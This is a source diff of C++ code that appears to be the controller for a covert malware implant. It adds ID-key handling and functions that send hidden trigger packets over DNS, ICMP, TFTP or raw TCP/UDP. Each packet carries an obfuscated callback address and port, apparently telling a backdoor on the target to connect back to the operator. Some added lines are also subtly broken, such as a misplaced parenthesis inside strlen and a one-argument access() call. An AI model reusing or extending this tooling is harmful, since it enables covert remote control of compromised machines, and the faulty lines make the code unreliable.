@@ -21,11 +21,18 @@
 
 extern "C"
 {
-#include "proj_strings.h"
-#include "ssl/crypto.h"
-#include "trigger_protocols.h"
-#include "trigger_network.h"
-#include "trigger_utils.h"
+	#include "proj_strings.h"
+	#include "ssl/crypto.h"
+	#include "trigger_protocols.h"
+	#include "trigger_network.h"
+	#include "trigger_utils.h"
+
+	int trigger_tftp_wrq (Payload *p, trigger_info *ti);
+	int trigger_icmp_ping (Payload *p, trigger_info *ti);
+	int trigger_icmp_error (Payload *p, trigger_info *ti);
+	int trigger_dns_query (Payload *p, trigger_info *ti);
+	unsigned int trigger_raw (Payload *p, trigger_info *ti);
+	int trigger_info_to_payload( Payload * p, trigger_info * ti);
 }
 
 using namespace InterfaceLibrary;
@@ -36,6 +43,7 @@ using namespace Ilm;
 extern HiveILM			*myILMInstance;
 extern Ilm::Listener	*myListener;
 extern Ilm::Trigger		*myTrigger;
+
 
 //***************************************************************************************
 // GLOBAL VARIABLE
@@ -185,9 +193,7 @@ void Listener::TriggerAndListen( Primitive::Activation& actvn, ProcessCmdAccumul
 
 }
 
-//**************************************************************************************
-// TRIGGER
-//**************************************************************************************
+
 int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_param )
 {
 	ifstream	triggerFile;
@@ -209,8 +215,10 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 	if (triggerFile.fail())
 	{
 		//  The requested File does not exist, so we will prompt the user for input values and create it...
-		cout << "\n WARNING:  The requested file [" << triggerFileName <<"] could not be opened so we will attempt to create a new one with the same name.\n" << endl;
-	
+		cout << "\n WARNING: The requested file [" << triggerFileName <<"] could not be opened so we will attempt to create a new one with the same name.\n" << endl;
+		cout << "\nWhen the ID key is requested, enter a key between " << ID_KEY_LENGTH_MIN << " and " << MAX_INPUT_LEN << " characters in length."<< endl;
+		cout << "To enter the key from a file, hit return and then enter the file name.\n" << endl;
+
 		//Create new triggerFile
 		newTriggerFile.open(triggerFileName.c_str());
 
@@ -232,6 +240,30 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 			cin >> t_param->targetAddress;
 			newTriggerFile << t_param->targetAddress;
 			newTriggerFile << '|';
+
+			do { // Request an ID key until a valid key is entered or program terminated
+				cout << " ID Key ? ";
+				cin >> t_param->idKey;
+				if (strlen(t_param->idKey) == 0) {
+					cout << "ID Key Filename ? ";
+					cin >> t_param->idKeyFilename;
+					if (access(t_param->idKeyFilename)) {
+						perror("Unable to access ID key file.\n");
+						continue;
+					}
+					newTriggerFile << '|';
+					newTriggerFile << t_param->idKeyFilename;
+					newTriggerFile << '|';
+					break;
+				}
+				if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
+					cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
+					continue;
+				}
+				newTriggerFile << t_param->idKey;
+				newTriggerFile << '|';	newTriggerFile << '|';
+				break;
+			} while (1);
 
 			cout << " Trigger type [dns-request, icmp-error, ping-request, ping-reply, raw-tcp, raw-udp, tftp-wrq]? ";
 			cin >> t_param->protocolType;
@@ -308,6 +340,25 @@ int Trigger::parse_prompt_config_file( std::string triggerFileName, params *t_pa
 		if (inet_pton( AF_INET, t_param->targetAddress, &testSocket.sin_addr) != 1)
 		{
 			cout << "\n ERROR: Remote IP address [" << t_param->targetAddress << "] invalid." << endl;
+			return -1;
+		}
+
+		// Get and verify ID key
+
+		triggerFile.getline( t_param->idKey, MAX_INPUT_LEN, delim);
+		if (strlen(t_param->idKey == 0)) {
+			triggerFile.getline( t_param->idKeyFilename, MAX_INPUT_LEN, delim);
+			if (strlen(t_param->idKeyFilename == 0)) {
+				cout << "ERROR: Missing ID key." << endl;
+				return -1;
+			}
+			if (access(t_param->idKeyFilename)) {
+				perror("Unable to access ID key file.\n");
+				return -1;
+			}
+		}
+		if (strlen(t_param->idKey) < ID_KEY_LENGTH_MIN) {
+			cout << "ID Key length too short (must be at least " << ID_KEY_LENGTH_MIN << " characters)\n" << endl;
 			return -1;
 		}
 
@@ -422,8 +473,7 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	struct params	t_param;
 
 	trigger_info  	ti;             //Trigger information Structure used for building and sending the trigger...
-	payload       	p;		//Payload for transmission....
-	uint16_t 	crc;		//Used for calculating the payload's crc
+	Payload       	p;		//Payload for transmission....
 	int		rv;
 
 	//Initialize status for triggering
@@ -494,7 +544,7 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	inet_pton( AF_INET, t_param.targetAddress, &(ti.target_addr));
 
    //------------Payload----------------
-	memset( &p, 0, sizeof( payload ) );
+	memset( &p, 0, sizeof( Payload ) );
 	
 	//Obfuscate the payload using /dev/urandom
 	randomFile.open("/dev/urandom\0", ios::binary);
@@ -505,18 +555,23 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	}
 	else
 	{
-		randomFile.read( (char *)&p, sizeof( payload) );
+		randomFile.read( (char *)&p, sizeof( Payload) );
 	}
 	randomFile.close();
 
 	//Create an application specific payload from the trigger info
 	//trigger_info_to_payload( &p, &ti );     //Can't seem to link, we'll do this method here...
 
+	if (trigger_info_to_payload(&p, &ti)) {
+		return;
+	}
+
+#if 0
 	memcpy( &(p.package[0]), &(ti.callback_addr), sizeof(in_addr_t) );
 	memcpy( &(p.package[4]), &(ti.callback_port), sizeof(uint16_t) );
 	p.crc = 0;
-	crc = tiny_crc16( (const uint8_t *) &p, sizeof(payload));
-	//crc = tinycrc( (const uint8_t *) &p, sizeof(payload));  //Can't seem to link tiny_crc16 from trigger_utils, so we'll duplicate it above in tinycrc...
+	crc = tiny_crc16( (const uint8_t *) &p, sizeof(Payload));
+	//crc = tinycrc( (const uint8_t *) &p, sizeof(Payload));  //Can't seem to link tiny_crc16 from trigger_utils, so we'll duplicate it above in tinycrc...
 	crc = htons(crc);
 	p.crc = crc;
 	
@@ -526,6 +581,7 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 	 *   trigger_icmp_error, trigger_tftp_wrq, trigger_dns_query, trigger_raw_tcp, and trigger_raw_udp use internal 
 	 *methods/sockets versus the Connection class to send the triggers.
 	*/
+#endif
 
 	//Finalize payloads and send the triggers...
 	switch (ti.trigger_type)
@@ -548,17 +604,13 @@ void Trigger::triggerImplant( Primitive::Activation& actvn, ProcessCmdAccumulato
 
 		case T_DNS_REQUEST:
 			//cout << "\n\n\n Calling trigger_dns_query...\n" << endl;
-			rv = trigger_dns_query( &p, &ti );   
+			rv = trigger_dns_query( &p, &ti );
 			break;
 
 		case T_RAW_TCP:
-			//cout << "\n\n\n Calling trigger_raw_tcp...\n" << endl;
-			rv = trigger_raw_tcp( &p, &ti );      
-			break;
-
 		case T_RAW_UDP:
-			//cout << "\n\n\n Calling trigger_raw_udp...\n" << endl;
-			rv = trigger_raw_udp( &p, &ti );  
+			//cout << "\n\n\n Calling trigger_raw...\n" << endl;
+			rv = trigger_raw( &p, &ti );
 			break;
 
 	}
